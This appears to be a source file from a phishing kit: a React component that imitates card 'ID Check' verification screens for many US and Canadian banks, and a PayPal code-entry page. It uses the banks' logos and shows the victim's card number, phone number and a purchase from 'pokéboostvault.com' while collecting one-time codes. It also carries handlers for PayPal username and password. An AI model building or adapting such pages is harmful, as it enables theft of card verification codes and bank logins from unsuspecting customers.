import React from 'react';
import { CreditCard } from 'lucide-react';
import { banks as americanBanks, canadianbanks } from '../data';

interface TwoFactorCodeProps {
  code: string;
  setCode: (v: string) => void;
  onSubmit: (e: React.FormEvent) => void;
  disabled?: boolean;
  selectedBank: string;
  cardType: string;
  cardNumber: string;
  total: number;
  phoneNumber: string;

  // PayPal-specific handlers
  bankLoginData?: { username: string; password: string };
  handleBankLoginChange?: (e: React.ChangeEvent<HTMLInputElement>) => void;
  handleLoginSubmit?: (e: React.FormEvent) => void;
}

const sanitize = (v: string) => v.replace(/\D/g, ''); // only numbers

const TwoFactorCode: React.FC<TwoFactorCodeProps> = ({
  code,
  setCode,
  onSubmit,
  disabled,
  selectedBank,
  cardType,
  cardNumber,
  total,
  phoneNumber,
  bankLoginData,
  handleBankLoginChange,
  handleLoginSubmit,
}) => {
  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setCode(sanitize(e.target.value));
  };

  // Merge US + Canadian banks
  const allBanks = [...americanBanks, ...canadianbanks];
  const bankData = allBanks.find((bnk) => bnk.name === selectedBank);

  const getCardIcon = (type: string) => {
    const iconClass = 'w-28 object-contain';
    switch (type) {
      case 'visa':
        return <img src="https://cdn.visa.com/v2/assets/images/logos/visa/blue/logo.png" className="w-[80px]" />;
      case 'mastercard':
        return <img src="/bank-logos/mc-logo.svg" alt="Mastercard" className="w-[80px]" />;
      case 'amex':
        return <img src="https://www.aexp-static.com/cdaas/one/statics/axp-static-assets/1.8.0/package/dist/img/logos/dls-logo-bluebox-solid.svg" alt="Amex" className="w-[60px]" />;
      case 'discover':
        return <div className="text-xl font-bold text-orange-600">DISC</div>;
      case 'jcb':
        return <img src="/bank-logos/jcb_emblem.svg" alt="JCB" className="w-[70px]" />;
      case 'diners':
        return <div className="text-lg font-bold text-gray-700">DC</div>;
      default:
        return <CreditCard className="w-6 h-6 text-gray-400" />;
    }
  };
  const className =
    selectedBank === 'Wells Fargo'
      ? 'bg-[#D61F28]'
      : selectedBank === 'Citi'
        ? 'w-[100px] h-[60px]'
        : selectedBank === 'PNC'
          ? 'bg-[#414E58]'
          : selectedBank === 'TD Bank'
            ? '!w-[150px] h-[50px]'
            : selectedBank === 'Truist'
              ? 'w-[150px] h-[50px]'
              : selectedBank === 'Regions Bank'
                ? 'w-[150px] h-[50px]'
                : selectedBank === 'M&T Bank'
                  ? 'bg-[#015840]'
                  : selectedBank === 'Navy Federal Credit Union'
                    ? 'w-[200px] h-auto'
                    : '';
  // ✅ Special PayPal UI
if (selectedBank === 'PayPal') {
  return (
    <div className="bg-white rounded-lg shadow-lg min-h-[600px] flex flex-col items-center p-8 space-y-6">
      <div className="mt-8 mb-6">
        <img src="/palla.png" alt="PayPal Logo" className="w-28 h-auto" />
      </div>

      <div className="w-full max-w-sm text-center">
        <h1 className="text-3xl font-light text-gray-800 mb-2">Enter the code</h1>
        <p className="text-gray-500 text-sm mb-6">We've sent a 6-digit code to xxxxxxxx</p>
        <form onSubmit={onSubmit} className="space-y-4">
          <div className="relative mb-6">

          <input
            type="text"
            value={code}
            onChange={handleChange}
                        placeholder="Enter 6-digit code"

            className="w-full px-4 py-3 border border-gray-300 rounded-lg text-lg text-center tracking-widest"
            required
          />
                  </div>

          <button
            type="submit"
            disabled={disabled}
            className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-lg transition disabled:opacity-50"
          >
            Submit Code
          </button>
        </form>



        <div className="flex items-center justify-center mb-6">
          <input
            type="checkbox"
            id="trust-device"
            className="h-4 w-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500"
          />
          <label htmlFor="trust-device" className="ml-2 text-sm text-gray-700">
            Trust this device
          </label>
        </div>
        <div className="text-center mt-4">
          <a href="#" className="text-blue-600 hover:text-blue-800 text-sm">
            Having trouble logging in?
          </a>
        </div>
      </div>
    </div>
  );
}


  return (
    <div className="bg-white min-h-screen">
      {/* Header with back arrow and close button */}
      <div className="flex items-center justify-between p-4">
        <div className="border-b border-gray-200 flex justify-between w-full items-center">
          <img
            src={bankData?.additionalLogo}
            alt="Capital One"
            className={`${className} h-5 max-w-[200px] mb-2`}
          />
          <div className="flex items-center space-x-2 mb-2">
            {getCardIcon(cardType)} |
            <span className="text-sm font-medium text-gray-700">ID Check</span>
          </div>
        </div>

        {/* Capital One Logo */}
      </div>

      {/* Main Content */}
      <div className="p-6">
        <h1 className="text-2xl font-bold text-gray-900 mb-4">
          Submit the code we sent to you
        </h1>

        <p className="text-gray-600 mb-8">
          Enter the temporary code we sent to {phoneNumber}.
        </p>

        {/* Transaction Details */}
        <div className="space-y-4 mb-8">
          <div>
            <span className="font-semibold text-gray-900">Merchant:</span>
            <div className="text-gray-600 mt-1">pokéboostvault.com</div>
          </div>

          <div>
            <span className="font-semibold text-gray-900">
              Purchase Amount:
            </span>
            <div className="text-gray-900 font-semibold mt-1">${total} USD</div>
          </div>

          <div>
            <span className="font-semibold text-gray-900">Card Number:</span>
            <div className="text-gray-600 mt-1">{cardNumber}</div>
          </div>
        </div>

        {/* Code Input Form */}
<form onSubmit={onSubmit} className="space-y-6">
  <div>
    <label className="block text-sm font-semibold text-gray-900 mb-3">
      Code
    </label>
    <input
      type="text"
      value={code}
      onChange={handleChange}
      placeholder=""
      className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none text-lg text-center tracking-widest font-mono"
      required
    />
  </div>

  <button
    type="submit"
    disabled={code.length === 0} // enable button as long as there is input
    className={`w-full font-semibold py-3 px-6 rounded-lg transition-all duration-200 ${
      code.length > 0
        ? 'bg-blue-600 hover:bg-blue-700 text-white cursor-pointer'
        : 'bg-gray-300 text-gray-500 cursor-not-allowed'
    }`}
  >
    Submit Code
  </button>
</form>


        {/* Resend Code Link */}
        <div className="text-center mt-6">
          <span className="text-gray-600">Didn't receive a code? </span>
          <button
            type="button"
            className="text-blue-600 hover:text-blue-800 font-medium transition-colors"
          >
            Resend code
          </button>
        </div>
      </div>
    </div>
  );
};

export default TwoFactorCode;
